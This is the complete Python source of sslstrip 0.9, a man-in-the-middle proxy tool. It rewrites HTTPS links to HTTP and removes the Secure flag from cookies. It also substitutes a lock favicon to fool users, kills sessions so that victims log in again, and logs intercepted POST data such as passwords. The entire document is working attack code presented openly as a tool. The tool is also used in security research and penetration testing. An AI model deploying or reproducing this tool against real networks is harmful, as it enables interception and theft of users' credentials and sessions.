__FILENAME__ = ClientRequest
# Copyright (c) 2004-2009 Moxie Marlinspike
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import urlparse, logging, os, sys, random

from twisted.web.http import Request
from twisted.web.http import HTTPChannel
from twisted.web.http import HTTPClient

from twisted.internet import ssl
from twisted.internet import defer
from twisted.internet import reactor
from twisted.internet.protocol import ClientFactory

from ServerConnectionFactory import ServerConnectionFactory
from ServerConnection import ServerConnection
from SSLServerConnection import SSLServerConnection
from URLMonitor import URLMonitor
from CookieCleaner import CookieCleaner
from DnsCache import DnsCache

class ClientRequest(Request):

    ''' This class represents incoming client requests and is essentially where
    the magic begins.  Here we remove the client headers we dont like, and then
    respond with either favicon spoofing, session denial, or proxy through HTTP
    or SSL to the server.
    '''    
    
    def __init__(self, channel, queued, reactor=reactor):
        Request.__init__(self, channel, queued)
        self.reactor       = reactor
        self.urlMonitor    = URLMonitor.getInstance()
        self.cookieCleaner = CookieCleaner.getInstance()
        self.dnsCache      = DnsCache.getInstance()
#        self.uniqueId      = random.randint(0, 10000)

    def cleanHeaders(self):
        headers = self.getAllHeaders().copy()

        if 'accept-encoding' in headers:
            del headers['accept-encoding']

        if 'if-modified-since' in headers:
            del headers['if-modified-since']

        if 'cache-control' in headers:
            del headers['cache-control']

        return headers

    def getPathFromUri(self):
        if (self.uri.find("http://") == 0):
            index = self.uri.find('/', 7)
            return self.uri[index:]

        return self.uri        

    def getPathToLockIcon(self):
        if os.path.exists("lock.ico"): return "lock.ico"

        scriptPath = os.path.abspath(os.path.dirname(sys.argv[0]))
        scriptPath = os.path.join(scriptPath, "../share/sslstrip/lock.ico")

        if os.path.exists(scriptPath): return scriptPath

        logging.warning("Error: Could not find lock.ico")
        return "lock.ico"        

    def handleHostResolvedSuccess(self, address):
        logging.debug("Resolved host successfully: %s -> %s" % (self.getHeader('host'), address))
        host              = self.getHeader("host")
        headers           = self.cleanHeaders()
        client            = self.getClientIP()
        path              = self.getPathFromUri()

        self.content.seek(0,0)
        postData          = self.content.read()
        url               = 'http://' + host + path

        self.dnsCache.cacheResolution(host, address)

        if (not self.cookieCleaner.isClean(self.method, client, host, headers)):
            logging.debug("Sending expired cookies...")
            self.sendExpiredCookies(host, path, self.cookieCleaner.getExpireHeaders(self.method, client,
                                                                                    host, headers, path))
        elif (self.urlMonitor.isSecureFavicon(client, path)):
            logging.debug("Sending spoofed favicon response...")
            self.sendSpoofedFaviconResponse()
        elif (self.urlMonitor.isSecureLink(client, url)):
            logging.debug("Sending request via SSL...")
            self.proxyViaSSL(address, self.method, path, postData, headers,
                             self.urlMonitor.getSecurePort(client, url))
        else:
            logging.debug("Sending request via HTTP...")
            self.proxyViaHTTP(address, self.method, path, postData, headers)

    def handleHostResolvedError(self, error):
        logging.warning("Host resolution error: " + str(error))
        self.finish()

    def resolveHost(self, host):
        address = self.dnsCache.getCachedAddress(host)

        if address != None:
            logging.debug("Host cached.")
            return defer.succeed(address)
        else:
            logging.debug("Host not cached.")
            return reactor.resolve(host)

    def process(self):
        logging.debug("Resolving host: %s" % (self.getHeader('host')))
        host     = self.getHeader('host')               
        deferred = self.resolveHost(host)

        deferred.addCallback(self.handleHostResolvedSuccess)
        deferred.addErrback(self.handleHostResolvedError)
        
    def proxyViaHTTP(self, host, method, path, postData, headers):
        connectionFactory          = ServerConnectionFactory(method, path, postData, headers, self)
        connectionFactory.protocol = ServerConnection
        self.reactor.connectTCP(host, 80, connectionFactory)

    def proxyViaSSL(self, host, method, path, postData, headers, port):
        clientContextFactory       = ssl.ClientContextFactory()
        connectionFactory          = ServerConnectionFactory(method, path, postData, headers, self)
        connectionFactory.protocol = SSLServerConnection
        self.reactor.connectSSL(host, port, connectionFactory, clientContextFactory)

    def sendExpiredCookies(self, host, path, expireHeaders):
        self.setResponseCode(302, "Moved")
        self.setHeader("Connection", "close")
        self.setHeader("Location", "http://" + host + path)
        
        for header in expireHeaders:
            self.setHeader("Set-Cookie", header)

        self.finish()        
        
    def sendSpoofedFaviconResponse(self):
        icoFile = open(self.getPathToLockIcon())

        self.setResponseCode(200, "OK")
        self.setHeader("Content-type", "image/x-icon")
        self.write(icoFile.read())
                
        icoFile.close()
        self.finish()

########NEW FILE########
__FILENAME__ = CookieCleaner
# Copyright (c) 2004-2011 Moxie Marlinspike
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import logging
import string

class CookieCleaner:
    '''This class cleans cookies we haven't seen before.  The basic idea is to
    kill sessions, which isn't entirely straight-forward.  Since we want this to
    be generalized, there's no way for us to know exactly what cookie we're trying
    to kill, which also means we don't know what domain or path it has been set for.

    The rule with cookies is that specific overrides general.  So cookies that are
    set for mail.foo.com override cookies with the same name that are set for .foo.com,
    just as cookies that are set for foo.com/mail override cookies with the same name
    that are set for foo.com/

    The best we can do is guess, so we just try to cover our bases by expiring cookies
    in a few different ways.  The most obvious thing to do is look for individual cookies
    and nail the ones we haven't seen coming from the server, but the problem is that cookies are often
    set by Javascript instead of a Set-Cookie header, and if we block those the site
    will think cookies are disabled in the browser.  So we do the expirations and whitlisting
    based on client,server tuples.  The first time a client hits a server, we kill whatever
    cookies we see then.  After that, we just let them through.  Not perfect, but pretty effective.

    '''

    _instance = None

    def getInstance():
        if CookieCleaner._instance == None:
            CookieCleaner._instance = CookieCleaner()

        return CookieCleaner._instance

    getInstance = staticmethod(getInstance)

    def __init__(self):
        self.cleanedCookies = set();
        self.enabled        = False

    def setEnabled(self, enabled):
        self.enabled = enabled

    def isClean(self, method, client, host, headers):
        if method == "POST":             return True
        if not self.enabled:             return True
        if not self.hasCookies(headers): return True
        
        return (client, self.getDomainFor(host)) in self.cleanedCookies

    def getExpireHeaders(self, method, client, host, headers, path):
        domain = self.getDomainFor(host)
        self.cleanedCookies.add((client, domain))

        expireHeaders = []

        for cookie in headers['cookie'].split(";"):
            cookie                 = cookie.split("=")[0].strip()            
            expireHeadersForCookie = self.getExpireCookieStringFor(cookie, host, domain, path)            
            expireHeaders.extend(expireHeadersForCookie)
        
        return expireHeaders

    def hasCookies(self, headers):
        return 'cookie' in headers        

    def getDomainFor(self, host):
        hostParts = host.split(".")
        return "." + hostParts[-2] + "." + hostParts[-1]

    def getExpireCookieStringFor(self, cookie, host, domain, path):
        pathList      = path.split("/")
        expireStrings = list()
        
        expireStrings.append(cookie + "=" + "EXPIRED;Path=/;Domain=" + domain + 
                             ";Expires=Mon, 01-Jan-1990 00:00:00 GMT\r\n")

        expireStrings.append(cookie + "=" + "EXPIRED;Path=/;Domain=" + host + 
                             ";Expires=Mon, 01-Jan-1990 00:00:00 GMT\r\n")

        if len(pathList) > 2:
            expireStrings.append(cookie + "=" + "EXPIRED;Path=/" + pathList[1] + ";Domain=" +
                                 domain + ";Expires=Mon, 01-Jan-1990 00:00:00 GMT\r\n")

            expireStrings.append(cookie + "=" + "EXPIRED;Path=/" + pathList[1] + ";Domain=" +
                                 host + ";Expires=Mon, 01-Jan-1990 00:00:00 GMT\r\n")
        
        return expireStrings

    

########NEW FILE########
__FILENAME__ = DnsCache

class DnsCache:    

    '''
    The DnsCache maintains a cache of DNS lookups, mirroring the browser experience.
    '''

    _instance          = None

    def __init__(self):
        self.cache = {}

    def cacheResolution(self, host, address):
        self.cache[host] = address

    def getCachedAddress(self, host):
        if host in self.cache:
            return self.cache[host]

        return None

    def getInstance():
        if DnsCache._instance == None:
            DnsCache._instance = DnsCache()

        return DnsCache._instance

    getInstance = staticmethod(getInstance)

########NEW FILE########
__FILENAME__ = ServerConnection
# Copyright (c) 2004-2009 Moxie Marlinspike
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import logging, re, string, random, zlib, gzip, StringIO

from twisted.web.http import HTTPClient
from URLMonitor import URLMonitor

class ServerConnection(HTTPClient):

    ''' The server connection is where we do the bulk of the stripping.  Everything that
    comes back is examined.  The headers we dont like are removed, and the links are stripped
    from HTTPS to HTTP.
    '''

    urlExpression     = re.compile(r"(https://[\w\d:#@%/;$()~_?\+-=\\\.&]*)", re.IGNORECASE)
    urlType           = re.compile(r"https://", re.IGNORECASE)
    urlExplicitPort   = re.compile(r'https://([a-zA-Z0-9.]+):[0-9]+/',  re.IGNORECASE)

    def __init__(self, command, uri, postData, headers, client):
        self.command          = command
        self.uri              = uri
        self.postData         = postData
        self.headers          = headers
        self.client           = client
        self.urlMonitor       = URLMonitor.getInstance()
        self.isImageRequest   = False
        self.isCompressed     = False
        self.contentLength    = None
        self.shutdownComplete = False

    def getLogLevel(self):
        return logging.DEBUG

    def getPostPrefix(self):
        return "POST"

    def sendRequest(self):
        logging.log(self.getLogLevel(), "Sending Request: %s %s"  % (self.command, self.uri))
        self.sendCommand(self.command, self.uri)

    def sendHeaders(self):
        for header, value in self.headers.items():
            logging.log(self.getLogLevel(), "Sending header: %s : %s" % (header, value))
            self.sendHeader(header, value)

        self.endHeaders()

    def sendPostData(self):
        logging.warning(self.getPostPrefix() + " Data (" + self.headers['host'] + "):\n" + str(self.postData))
        self.transport.write(self.postData)

    def connectionMade(self):
        logging.log(self.getLogLevel(), "HTTP connection made.")
        self.sendRequest()
        self.sendHeaders()
        
        if (self.command == 'POST'):
            self.sendPostData()

    def handleStatus(self, version, code, message):
        logging.log(self.getLogLevel(), "Got server response: %s %s %s" % (version, code, message))
        self.client.setResponseCode(int(code), message)

    def handleHeader(self, key, value):
        logging.log(self.getLogLevel(), "Got server header: %s:%s" % (key, value))

        if (key.lower() == 'location'):
            value = self.replaceSecureLinks(value)

        if (key.lower() == 'content-type'):
            if (value.find('image') != -1):
                self.isImageRequest = True
                logging.debug("Response is image content, not scanning...")

        if (key.lower() == 'content-encoding'):
            if (value.find('gzip') != -1):
                logging.debug("Response is compressed...")
                self.isCompressed = True
        elif (key.lower() == 'content-length'):
            self.contentLength = value
        elif (key.lower() == 'set-cookie'):
            self.client.responseHeaders.addRawHeader(key, value)
        else:
            self.client.setHeader(key, value)

    def handleEndHeaders(self):
       if (self.isImageRequest and self.contentLength != None):
           self.client.setHeader("Content-Length", self.contentLength)

       if self.length == 0:
           self.shutdown()
                        
    def handleResponsePart(self, data):
        if (self.isImageRequest):
            self.client.write(data)
        else:
            HTTPClient.handleResponsePart(self, data)

    def handleResponseEnd(self):
        if (self.isImageRequest):
            self.shutdown()
        else:
            HTTPClient.handleResponseEnd(self)

    def handleResponse(self, data):
        if (self.isCompressed):
            logging.debug("Decompressing content...")
            data = gzip.GzipFile('', 'rb', 9, StringIO.StringIO(data)).read()
            
        logging.log(self.getLogLevel(), "Read from server:\n" + data)

        data = self.replaceSecureLinks(data)

        if (self.contentLength != None):
            self.client.setHeader('Content-Length', len(data))
        
        self.client.write(data)
        self.shutdown()

    def replaceSecureLinks(self, data):
        iterator = re.finditer(ServerConnection.urlExpression, data)

        for match in iterator:
            url = match.group()

            logging.debug("Found secure reference: " + url)

            url = url.replace('https://', 'http://', 1)
            url = url.replace('&amp;', '&')
            self.urlMonitor.addSecureLink(self.client.getClientIP(), url)

        data = re.sub(ServerConnection.urlExplicitPort, r'http://\1/', data)
        return re.sub(ServerConnection.urlType, 'http://', data)

    def shutdown(self):
        if not self.shutdownComplete:
            self.shutdownComplete = True
            self.client.finish()
            self.transport.loseConnection()



########NEW FILE########
__FILENAME__ = ServerConnectionFactory
# Copyright (c) 2004-2009 Moxie Marlinspike
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import logging
from twisted.internet.protocol import ClientFactory

class ServerConnectionFactory(ClientFactory):

    def __init__(self, command, uri, postData, headers, client):
        self.command      = command
        self.uri          = uri
        self.postData     = postData
        self.headers      = headers
        self.client       = client

    def buildProtocol(self, addr):
        return self.protocol(self.command, self.uri, self.postData, self.headers, self.client)
    
    def clientConnectionFailed(self, connector, reason):
        logging.debug("Server connection failed.")

        destination = connector.getDestination()

        if (destination.port != 443):
            logging.debug("Retrying via SSL")
            self.client.proxyViaSSL(self.headers['host'], self.command, self.uri, self.postData, self.headers, 443)
        else:
            self.client.finish()


########NEW FILE########
__FILENAME__ = SSLServerConnection
# Copyright (c) 2004-2009 Moxie Marlinspike
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import logging, re, string

from ServerConnection import ServerConnection

class SSLServerConnection(ServerConnection):

    ''' 
    For SSL connections to a server, we need to do some additional stripping.  First we need
    to make note of any relative links, as the server will be expecting those to be requested
    via SSL as well.  We also want to slip our favicon in here and kill the secure bit on cookies.
    '''

    cookieExpression   = re.compile(r"([ \w\d:#@%/;$()~_?\+-=\\\.&]+); ?Secure", re.IGNORECASE)
    cssExpression      = re.compile(r"url\(([\w\d:#@%/;$~_?\+-=\\\.&]+)\)", re.IGNORECASE)
    iconExpression     = re.compile(r"<link rel=\"shortcut icon\" .*href=\"([\w\d:#@%/;$()~_?\+-=\\\.&]+)\".*>", re.IGNORECASE)
    linkExpression     = re.compile(r"<((a)|(link)|(img)|(script)|(frame)) .*((href)|(src))=\"([\w\d:#@%/;$()~_?\+-=\\\.&]+)\".*>", re.IGNORECASE)
    headExpression     = re.compile(r"<head>", re.IGNORECASE)

    def __init__(self, command, uri, postData, headers, client):
        ServerConnection.__init__(self, command, uri, postData, headers, client)

    def getLogLevel(self):
        return logging.INFO

    def getPostPrefix(self):
        return "SECURE POST"

    def handleHeader(self, key, value):
        if (key.lower() == 'set-cookie'):
            value = SSLServerConnection.cookieExpression.sub("\g<1>", value)

        ServerConnection.handleHeader(self, key, value)

    def stripFileFromPath(self, path):
        (strippedPath, lastSlash, file) = path.rpartition('/')
        return strippedPath

    def buildAbsoluteLink(self, link):
        absoluteLink = ""
        
        if ((not link.startswith('http')) and (not link.startswith('/'))):                
            absoluteLink = "http://"+self.headers['host']+self.stripFileFromPath(self.uri)+'/'+link

            logging.debug("Found path-relative link in secure transmission: " + link)
            logging.debug("New Absolute path-relative link: " + absoluteLink)                
        elif not link.startswith('http'):
            absoluteLink = "http://"+self.headers['host']+link

            logging.debug("Found relative link in secure transmission: " + link)
            logging.debug("New Absolute link: " + absoluteLink)                            

        if not absoluteLink == "":                
            absoluteLink = absoluteLink.replace('&amp;', '&')
            self.urlMonitor.addSecureLink(self.client.getClientIP(), absoluteLink);        

    def replaceCssLinks(self, data):
        iterator = re.finditer(SSLServerConnection.cssExpression, data)

        for match in iterator:
            self.buildAbsoluteLink(match.group(1))

        return data

    def replaceFavicon(self, data):
        match = re.search(SSLServerConnection.iconExpression, data)

        if (match != None):
            data = re.sub(SSLServerConnection.iconExpression,
                          "<link rel=\"SHORTCUT ICON\" href=\"/favicon-x-favicon-x.ico\">", data)
        else:
            data = re.sub(SSLServerConnection.headExpression,
                          "<head><link rel=\"SHORTCUT ICON\" href=\"/favicon-x-favicon-x.ico\">", data)
            
        return data
        
    def replaceSecureLinks(self, data):
        data = ServerConnection.replaceSecureLinks(self, data)
        data = self.replaceCssLinks(data)

        if (self.urlMonitor.isFaviconSpoofing()):
            data = self.replaceFavicon(data)

        iterator = re.finditer(SSLServerConnection.linkExpression, data)

        for match in iterator:
            self.buildAbsoluteLink(match.group(10))

        return data

########NEW FILE########
__FILENAME__ = StrippingProxy
# Copyright (c) 2004-2009 Moxie Marlinspike
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

from twisted.web.http import HTTPChannel
from ClientRequest import ClientRequest

class StrippingProxy(HTTPChannel):
    '''sslstrip is, at heart, a transparent proxy server that does some unusual things.
    This is the basic proxy server class, where we get callbacks for GET and POST methods.
    We then proxy these out using HTTP or HTTPS depending on what information we have about
    the (connection, client_address) tuple in our cache.      
    '''

    requestFactory = ClientRequest

########NEW FILE########
__FILENAME__ = URLMonitor
# Copyright (c) 2004-2009 Moxie Marlinspike
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import re

class URLMonitor:    

    '''
    The URL monitor maintains a set of (client, url) tuples that correspond to requests which the
    server is expecting over SSL.  It also keeps track of secure favicon urls.
    '''

    # Start the arms race, and end up here...
    javascriptTrickery = [re.compile("http://.+\.etrade\.com/javascript/omntr/tc_targeting\.html")]
    _instance          = None

    def __init__(self):
        self.strippedURLs       = set()
        self.strippedURLPorts   = {}
        self.faviconReplacement = False

    def isSecureLink(self, client, url):
        for expression in URLMonitor.javascriptTrickery:
            if (re.match(expression, url)):
                return True

        return (client,url) in self.strippedURLs

    def getSecurePort(self, client, url):
        if (client,url) in self.strippedURLs:
            return self.strippedURLPorts[(client,url)]
        else:
            return 443

    def addSecureLink(self, client, url):
        methodIndex = url.find("//") + 2
        method      = url[0:methodIndex]

        pathIndex   = url.find("/", methodIndex)
        host        = url[methodIndex:pathIndex]
        path        = url[pathIndex:]

        port        = 443
        portIndex   = host.find(":")

        if (portIndex != -1):
            host = host[0:portIndex]
            port = host[portIndex+1:]
            if len(port) == 0:
                port = 443
        
        url = method + host + path

        self.strippedURLs.add((client, url))
        self.strippedURLPorts[(client, url)] = int(port)

    def setFaviconSpoofing(self, faviconSpoofing):
        self.faviconSpoofing = faviconSpoofing

    def isFaviconSpoofing(self):
        return self.faviconSpoofing

    def isSecureFavicon(self, client, url):
        return ((self.faviconSpoofing == True) and (url.find("favicon-x-favicon-x.ico") != -1))

    def getInstance():
        if URLMonitor._instance == None:
            URLMonitor._instance = URLMonitor()

        return URLMonitor._instance

    getInstance = staticmethod(getInstance)

########NEW FILE########
__FILENAME__ = sslstrip
#!/usr/bin/env python

"""sslstrip is a MITM tool that implements Moxie Marlinspike's SSL stripping attacks."""
 
__author__ = "Moxie Marlinspike"
__email__  = "moxie@thoughtcrime.org"
__license__= """
Copyright (c) 2004-2009 Moxie Marlinspike <moxie@thoughtcrime.org>
 
This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License as
published by the Free Software Foundation; either version 3 of the
License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but
WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
USA

"""

from twisted.web import http
from twisted.internet import reactor

from sslstrip.StrippingProxy import StrippingProxy
from sslstrip.URLMonitor import URLMonitor
from sslstrip.CookieCleaner import CookieCleaner

import sys, getopt, logging, traceback, string, os

gVersion = "0.9"

def usage():
    print "\nsslstrip " + gVersion + " by Moxie Marlinspike"
    print "Usage: sslstrip <options>\n"
    print "Options:"
    print "-w <filename>, --write=<filename> Specify file to log to (optional)."
    print "-p , --post                       Log only SSL POSTs. (default)"
    print "-s , --ssl                        Log all SSL traffic to and from server."
    print "-a , --all                        Log all SSL and HTTP traffic to and from server."
    print "-l <port>, --listen=<port>        Port to listen on (default 10000)."
    print "-f , --favicon                    Substitute a lock favicon on secure requests."
    print "-k , --killsessions               Kill sessions in progress."
    print "-h                                Print this help message."
    print ""

def parseOptions(argv):
    logFile      = 'sslstrip.log'
    logLevel     = logging.WARNING
    listenPort   = 10000
    spoofFavicon = False
    killSessions = False
    
    try:                                
        opts, args = getopt.getopt(argv, "hw:l:psafk", 
                                   ["help", "write=", "post", "ssl", "all", "listen=", 
                                    "favicon", "killsessions"])

        for opt, arg in opts:
            if opt in ("-h", "--help"):
                usage()
                sys.exit()
            elif opt in ("-w", "--write"):
                logFile = arg
            elif opt in ("-p", "--post"):
                logLevel = logging.WARNING
            elif opt in ("-s", "--ssl"):
                logLevel = logging.INFO
            elif opt in ("-a", "--all"):
                logLevel = logging.DEBUG
            elif opt in ("-l", "--listen"):
                listenPort = arg
            elif opt in ("-f", "--favicon"):
                spoofFavicon = True
            elif opt in ("-k", "--killsessions"):
                killSessions = True

        return (logFile, logLevel, listenPort, spoofFavicon, killSessions)
                    
    except getopt.GetoptError:           
        usage()                          
        sys.exit(2)                         

def main(argv):
    (logFile, logLevel, listenPort, spoofFavicon, killSessions) = parseOptions(argv)
        
    logging.basicConfig(level=logLevel, format='%(asctime)s %(message)s',
                        filename=logFile, filemode='w')

    URLMonitor.getInstance().setFaviconSpoofing(spoofFavicon)
    CookieCleaner.getInstance().setEnabled(killSessions)

    strippingFactory              = http.HTTPFactory(timeout=10)
    strippingFactory.protocol     = StrippingProxy

    reactor.listenTCP(int(listenPort), strippingFactory)
                
    print "\nsslstrip " + gVersion + " by Moxie Marlinspike running..."

    reactor.run()

if __name__ == '__main__':
    main(sys.argv[1:])

########NEW FILE########
